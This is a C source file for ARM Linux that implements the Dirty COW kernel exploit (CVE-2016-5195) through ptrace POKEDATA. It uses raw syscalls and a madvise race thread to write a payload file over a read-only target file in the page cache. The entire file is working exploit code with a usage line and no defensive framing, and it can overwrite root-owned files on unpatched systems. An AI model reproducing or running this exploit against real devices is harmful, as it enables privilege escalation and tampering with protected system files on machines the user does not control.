/* ptracecow2.c - Dirty COW (CVE-2016-5195) via PTRACE_POKEDATA, binary payload file
 * usage: ptracecow2 <target-file> <payload-file>
 * Page-cache only; reboot restores the target.
 */
#define SYS_exit        1
#define SYS_read        3
#define SYS_write       4
#define SYS_open        5
#define SYS_close       6
#define SYS_lseek       19
#define SYS_ptrace      26
#define SYS_pause       29
#define SYS_kill        37
#define SYS_wait4       114
#define SYS_clone       120
#define SYS_nanosleep   162
#define SYS_mmap2       192
#define SYS_madvise     220
#define SYS_gettid      224

#define PTRACE_POKEDATA 5
#define PTRACE_ATTACH   16
#define PTRACE_DETACH   17
#define PTRACE_CONT     7

#define O_RDONLY        0
#define PROT_READ       1
#define PROT_WRITE      2
#define MAP_PRIVATE     2
#define MAP_SHARED      1
#define MAP_ANONYMOUS   0x20
#define MADV_DONTNEED   4
#define CLONE_VM        0x00000100
#define CLONE_FS        0x00000200
#define CLONE_FILES     0x00000400
#define CLONE_SIGHAND   0x00000800
#define CLONE_THREAD    0x00010000
#define WALL            0x40000000

static inline long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    register long r3 asm("r3") = d;
    register long r4 asm("r4") = e;
    register long r5 asm("r5") = f;
    asm volatile("mov r7, %[n]\n\tsvc 0"
                 : "+r"(r0)
                 : [n] "r"(n), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
                 : "r7", "memory");
    return r0;
}
static long o(const char *p, long f, long m) { return sc6(5, (long)p, f, m, 0, 0, 0); }
static long r_(long fd, void *b, long l)     { return sc6(3, fd, (long)b, l, 0, 0, 0); }
static long w_(long fd, const void *b, long l){ return sc6(4, fd, (long)b, l, 0, 0, 0); }
static long ls(long fd, long off, long wh)   { return sc6(19, fd, off, wh, 0, 0, 0); }
static long mm(long a, long l, long p, long f, long fd, long o) { return sc6(192, a, l, p, f, fd, o); }
static void ex(long c) { sc6(1, c, 0, 0, 0, 0, 0); for (;;) {} }

static long slen(const char *s) { long n = 0; while (s[n]) n++; return n; }
static int memcmp_(const void *a, const void *b, long n)
{
    const unsigned char *x = a, *y = b;
    for (long i = 0; i < n; i++) if (x[i] != y[i]) return x[i] - y[i];
    return 0;
}
static void puts_(const char *s) { w_(1, s, slen(s)); }
static void ph(const char *tag, long v)
{
    char b[64];
    int i = 0;
    while (*tag) b[i++] = *tag++;
    b[i++] = '=';
    b[i++] = '0'; b[i++] = 'x';
    unsigned long u = (unsigned long)v;
    for (int k = 0; k < 8; k++) {
        int d = (u >> ((7 - k) * 4)) & 0xf;
        b[i++] = d < 10 ? '0' + d : 'a' + d - 10;
    }
    b[i++] = '\n';
    w_(1, b, i);
}

static volatile long *ctl;   /* [0]=ready [1]=tidA [2]=stop [3]=mcount */
static void *g_map;
static long g_len;
static const unsigned char *g_payload;

static void thread_madvise(void)
{
    ctl[1] = sc6(SYS_gettid, 0, 0, 0, 0, 0, 0);
    while (!ctl[2]) {
        sc6(SYS_madvise, (long)g_map, g_len, MADV_DONTNEED, 0, 0, 0);
        ctl[3]++;
    }
    for (;;) ex(0);
}

__attribute__((naked)) static long spawn_raw(long flags, long stack)
{
    asm volatile(
        "mov r7, #120\n"
        "svc 0\n"
        "cmp r0, #0\n"
        "bxne lr\n"
        "ldr r0, [sp], #4\n"
        "blx r0\n"
        "mov r0, #0\n"
        "mov r7, #1\n"
        "svc 0\n");
}

static long spawn(void (*fn)(void))
{
    long stack = mm(0, 1 << 16, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    long *top = (long *)(stack + (1 << 16));
    top[-1] = (long)fn;
    return spawn_raw(CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_THREAD,
                     (long)(top - 1));
}

static unsigned char pbuf[65536];
static unsigned char cbuf2[65536];

int main(int argc, char **argv)
{
    if (argc < 3) { puts_("usage: ptracecow2 <target> <payloadfile>\n"); return 1; }

    const char *path = argv[1];
    long pfd = o(argv[2], O_RDONLY, 0);
    if (pfd < 0) { puts_("open payload failed\n"); return 2; }
    long plen = r_(pfd, pbuf, sizeof pbuf);
    sc6(SYS_close, pfd, 0, 0, 0, 0, 0);
    if (plen <= 0) { puts_("read payload failed\n"); return 2; }
    g_payload = pbuf;
    g_len = plen;

    long fd = o(path, O_RDONLY, 0);
    if (fd < 0) { puts_("open target failed\n"); return 2; }
    long size = ls(fd, 0, 2);
    if (g_len > size) g_len = size;
    g_map = (void *)mm(0, size, PROT_READ, MAP_PRIVATE, fd, 0);
    if ((long)g_map < 0 && (long)g_map > -4096) { puts_("mmap failed\n"); return 3; }

    ctl = (volatile long *)mm(0, 4096, PROT_READ | PROT_WRITE,
                              MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    ctl[0] = ctl[1] = ctl[2] = ctl[3] = 0;

    long pid = sc6(SYS_clone, 17, 0, 0, 0, 0, 0);
    if (pid == 0) {
        spawn(thread_madvise);
        ctl[0] = 1;
        for (;;) sc6(SYS_pause, 0, 0, 0, 0, 0, 0);
    }

    while (!ctl[0]) sc6(SYS_nanosleep, 0, 1000000, 0, 0, 0, 0);
    while (!ctl[1]) sc6(SYS_nanosleep, 0, 1000000, 0, 0, 0, 0);
    ph("child", pid);
    ph("tidA", ctl[1]);
    ph("plen", g_len);

    long st[2];
    long at = sc6(SYS_ptrace, PTRACE_ATTACH, pid, 0, 0, 0, 0);
    ph("attach", at);
    sc6(SYS_wait4, pid, (long)st, WALL, 0, 0, 0);
    sc6(SYS_ptrace, PTRACE_CONT, ctl[1], 0, 0, 0, 0);

    long nw = (g_len + 3) / 4;
    long success = 0;
    for (long outer = 0; outer < 2000000 && !success; outer++) {
        for (long i = 0; i < nw; i++) {
            unsigned long word = 0;
            for (int b = 0; b < 4; b++) {
                long idx = i * 4 + b;
                if (idx < g_len) word |= ((unsigned long)pbuf[idx]) << (8 * b);
            }
            sc6(SYS_ptrace, PTRACE_POKEDATA, pid, (long)g_map + i * 4, word, 0, 0);
        }
        if ((outer & 0xff) == 0) {
            long f2 = o(path, O_RDONLY, 0);
            long n = r_(f2, cbuf2, g_len);
            sc6(SYS_close, f2, 0, 0, 0, 0, 0);
            if (n == g_len && memcmp_(cbuf2, pbuf, g_len) == 0) success = 1;
        }
    }
    ph("success", success);
    ph("mcount", ctl[3]);

    ctl[2] = 1;
    sc6(SYS_ptrace, PTRACE_DETACH, pid, 0, 0, 0, 0);
    sc6(SYS_kill, pid, 18, 0, 0, 0, 0);
    sc6(SYS_kill, pid, 9, 0, 0, 0, 0);
    puts_(success ? "DONE\n" : "TIMEOUT\n");
    return success ? 0 : 4;
}

void _start(void)
{
    long *p;
    asm volatile("mov %0, sp" : "=r"(p));
    int argc = (int)p[0];
    char **argv = (char **)&p[1];
    long r = main(argc, argv);
    ex(r);
}
